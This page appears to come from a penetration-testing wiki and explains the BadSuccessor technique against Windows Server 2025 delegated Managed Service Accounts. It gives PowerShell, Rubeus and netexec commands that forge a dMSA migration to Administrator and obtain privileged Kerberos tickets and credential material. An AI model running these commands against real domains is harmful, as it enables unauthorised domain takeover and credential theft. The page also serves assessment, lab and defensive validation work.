_body: "# BadSuccessor\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n## Overview\n\n**BadSuccessor** abuses the\
  \ **delegated Managed Service Account** (**dMSA**) migration workflow introduced in **Windows Server 2025**. A dMSA can\
  \ be linked to a legacy account through **`msDS-ManagedAccountPrecededByLink`** and moved through the migration states stored\
  \ in **`msDS-DelegatedMSAState`**. If an attacker can create a dMSA in a writable OU and control those attributes, the KDC\
  \ can issue tickets for the attacker-controlled dMSA with the **authorization context of the linked account**.\n\nIn practice\
  \ this means a low-privileged user who only has delegated OU rights can create a new dMSA, point it at `Administrator`,\
  \ complete the migration state, and then obtain a TGT whose PAC contains privileged groups such as **Domain Admins**.\n\n\
  ## dMSA migration details that matter\n\n- dMSA is a **Windows Server 2025** feature.\n- `Start-ADServiceAccountMigration`\
  \ sets the migration into the **started** state.\n- `Complete-ADServiceAccountMigration` sets the migration into the **completed**\
  \ state.\n- `msDS-DelegatedMSAState = 1` means migration started.\n- `msDS-DelegatedMSAState = 2` means migration completed.\n\
  - During legitimate migration, the dMSA is meant to replace the superseded account transparently, so the KDC/LSA preserve\
  \ access that the previous account already had.\n\nMicrosoft Learn also notes that during migration the original account\
  \ is tied to the dMSA and the dMSA is intended to access what the old account could access. This is the security assumption\
  \ BadSuccessor abuses.\n\n## Requirements\n\n1. A domain where **dMSA exists**, which means **Windows Server 2025** support\
  \ is present on the AD side.\n2. The attacker can **create** `msDS-DelegatedManagedServiceAccount` objects in some OU, or\
  \ has equivalent broad child-object creation rights there.\n3. The attacker can **write** the relevant dMSA attributes or\
  \ fully control the dMSA they just created.\n4. The attacker can request Kerberos tickets from a domain-joined context or\
  \ from a tunnel that reaches LDAP/Kerberos.\n\n### Practical checks\n\nThe cleanest operator signal is to verify the domain/forest\
  \ level and confirm the environment is already using the new Server 2025 stack:\n\n```powershell\nGet-ADDomain | Select\
  \ Name,DomainMode\nGet-ADForest | Select Name,ForestMode\n```\n\nIf you see values such as `Windows2025Domain` and `Windows2025Forest`,\
  \ treat **BadSuccessor / dMSA migration abuse** as a priority check.\n\nYou can also enumerate writable OUs delegated for\
  \ dMSA creation with public tooling:\n\n```powershell\n.\\Get-BadSuccessorOUPermissions.ps1\n```\n\n```bash\nnetexec ldap\
  \ <dc> -u <user> -p '<pass>' -M badsuccessor\n```\n\n## Abuse flow\n\n1. Create a dMSA in an OU where you have delegated\
  \ create-child rights.\n2. Set **`msDS-ManagedAccountPrecededByLink`** to the DN of a privileged target such as `CN=Administrator,CN=Users,DC=corp,DC=local`.\n\
  3. Set **`msDS-DelegatedMSAState`** to `2` to mark the migration as completed.\n4. Request a TGT for the new dMSA and use\
  \ the returned ticket to access privileged services.\n\nPowerShell example:\n\n```powershell\nNew-ADServiceAccount -Name\
  \ attacker_dMSA -DNSHostName host.corp.local -Path \"OU=Delegated,DC=corp,DC=local\"\nSet-ADServiceAccount attacker_dMSA\
  \ -Add @{\n    msDS-ManagedAccountPrecededByLink=\"CN=Administrator,CN=Users,DC=corp,DC=local\"\n}\nSet-ADServiceAccount\
  \ attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}\n```\n\nTicket request / operational tooling examples:\n\n```bash\n\
  Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>\n\
  netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker\
  \ TARGET_ACCOUNT=Administrator\n```\n\n## Why this is more than privilege escalation\n\nDuring legitimate migration, Windows\
  \ also needs the new dMSA to handle tickets that were issued for the previous account before cutover. This is why dMSA-related\
  \ ticket material can include **current** and **previous** keys in the **`KERB-DMSA-KEY-PACKAGE`** flow.\n\nFor an attacker-controlled\
  \ fake migration, that behavior can turn BadSuccessor into:\n\n- **Privilege escalation** by inheriting privileged group\
  \ SIDs in the PAC.\n- **Credential material exposure** because previous-key handling can expose material equivalent to the\
  \ predecessor's RC4/NT hash in vulnerable workflows.\n\nThat makes the technique useful both for direct domain takeover\
  \ and for follow-on operations such as pass-the-hash or wider credential compromise.\n\n## Notes on patch status\n\nThe\
  \ original BadSuccessor behavior is **not just a theoretical 2025 preview issue**. Microsoft assigned it **CVE-2025-53779**\
  \ and published a security update in **August 2025**. Keep this attack documented for:\n\n- **labs / CTFs / assume-breach\
  \ exercises**\n- **unpatched Windows Server 2025 environments**\n- **validation of OU delegations and dMSA exposure during\
  \ assessments**\n\nDo not assume a Windows Server 2025 domain is vulnerable just because dMSA exists; verify patch level\
  \ and test carefully.\n\n## Tools\n\n- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)\n- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)\n\
